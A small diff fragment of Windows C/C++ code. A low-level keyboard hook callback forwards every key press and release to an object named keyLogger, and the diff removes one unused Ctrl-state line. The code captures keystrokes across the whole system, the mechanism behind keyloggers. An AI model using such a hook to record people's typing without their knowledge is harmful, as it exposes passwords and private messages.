@@ -13,7 +13,6 @@ LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam)
 {
 	KBDLLHOOKSTRUCT *ks = (KBDLLHOOKSTRUCT*)lParam;
 	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
-		BOOL bctrl = GetAsyncKeyState(VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);
 		keyLogger.OnKeyDown(ks->vkCode);
 	} else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
 		keyLogger.OnKeyUp(ks->vkCode);
